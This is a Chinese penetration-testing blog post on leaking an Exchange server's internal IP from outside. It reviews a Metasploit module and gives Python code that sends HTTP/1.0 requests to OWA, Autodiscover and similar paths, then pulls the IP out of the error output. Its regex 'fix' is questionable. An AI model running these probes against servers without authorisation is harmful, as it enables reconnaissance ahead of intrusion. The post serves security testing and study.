---
layout: post
title: 渗透基础——获得Exchange服务器的内网IP
---


## 0x00 前言
---

在渗透测试中，为了搜集信息，常常需要从外网获得Exchange服务器的内网IP，公开资料显示msf的`auxiliary/scanner/http/owa_iis_internal_ip`插件支持这个功能，但是这个插件公开于2012年，已不再适用于Exchange 2013、2016和2019，本文将要介绍一种更为通用的方法，开源代码，记录细节。

## 0x01 简介
---

本文将要介绍以下内容：

- owa_iis_internal_ip插件介绍
- 更为通用的方法
- Python开源代码

## 0x02 owa_iis_internal_ip插件介绍
---

msf的`auxiliary/scanner/http/owa_iis_internal_ip`插件支持探测Exchange服务器的内网IP，对应kali系统下的位置为：`/usr/share/metasploit-framework/modules/auxiliary/scanner/http/owa_iis_internal_ip.rb`

github上的地址为：https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/http/owa_iis_internal_ip.rb

通过阅读源码，可以总结出实现原理：

- 设置HTTP协议为1.0并访问特定URL
- 在返回数据中，如果状态码为401，在Header中的`"WWW-Authenticate"`会包含内网IP
- 在返回数据中，如果状态码位于300和310之间，在Header中的`"Location"`会包含内网IP

在提取IP时，使用正则表达式`(192\.168\.[0-9]{1,3}\.[0-9]{1,3}|10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|172\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})`，这里存在bug：只能筛选出格式为`"192.168.*.*"`的内网IP

为了修复这个bug，可以将正则表达式修改为`([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|172\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})`

**注：**

修改插件后需要执行命令`reload_all`来重新加载msf插件

修复上面的bug后，我在测试Exchange 2013、2016和2019时仍然无法获得准确的内网IP

## 0x03 更为通用的方法
---

这里给出一种基于owa_iis_internal_ip插件的方法，使用Python实现，适用范围更广

思路如下：

利用Python设置HTTP协议为1.0并访问特定URL，在报错结果中暴露出Exchange服务器的内网IP

需要细节如下：

#### (1)Python设置HTTP协议为1.0

Python2：

```
import requests
import httplib
httplib.HTTPConnection._http_vsn = 10
httplib.HTTPConnection._http_vsn_str = 'HTTP/1.0'
```

Python3：

```
import requests
from http import client
client.HTTPConnection._http_vsn=10
client.HTTPConnection._http_vsn_str='HTTP/1.0'
```

#### (2)设置访问URL

owa_iis_internal_ip插件中提到的URL：

```
urls = ["/Microsoft-Server-ActiveSync/default.eas",
      "/Microsoft-Server-ActiveSync",
      "/Autodiscover/Autodiscover.xml",
      "/Autodiscover",
      "/Exchange",
      "/Rpc",
      "/EWS/Exchange.asmx",
      "/EWS/Services.wsdl",
      "/EWS",
      "/ecp",
      "/OAB",
      "/OWA",
      "/aspnet_client",
      "/PowerShell"]
```

经过多个环境的测试，更为精确的URL如下：

```
urls = ["/OWA",
      "/Autodiscover",
      "/Exchange",
      "/ecp",
      "/aspnet_client"]
```

#### (3)测试代码

```
#python3
import requests
import urllib3
urllib3.disable_warnings()
from http import client
client.HTTPConnection._http_vsn=10
client.HTTPConnection._http_vsn_str='HTTP/1.0'
try:
    url = "https://mail.test.com/OWA"
    response = requests.get(url, verify = False)
    print(response.status_code)
    print(response.text)
    print(response.headers)
except Exception as e:
    print(e)
```


回显结果：

`HTTPSConnectionPool(host='192.168.1.1', port=443): Max retries exceeded with url:/owa/auth/logon.aspx?url=https://192.168.1.1/OWA/&reason=0 (Caused by NewConnectionError('<urllib3.connection.HTTPSConnection object at 0x0000000003604CC8>: Failed to establish a new connection: [WinError 10060] A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond'))`

从报错信息中，我们可以看到Exchange服务器的IP，这里只需要加一个正则表达式`host='(.*?)',`即可提取出来IP

## 0x04 开源代码
---

完整的实现代码已上传至github，地址如下：

https://github.com/3gstudent/Homework-of-Python/blob/master/Exchange_GetInternalIP.py

代码支持5种方式探测内网IP

目前测试结果显示，该脚本支持Exchange 2010、2013、2016和2019，能够稳定获得内网IP

## 0x05 小结
---

本文分析了msf的`auxiliary/scanner/http/owa_iis_internal_ip`插件，对于获得Exchange服务器的内网IP，给出了一个更为通用的方法，开源代码，记录细节。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)

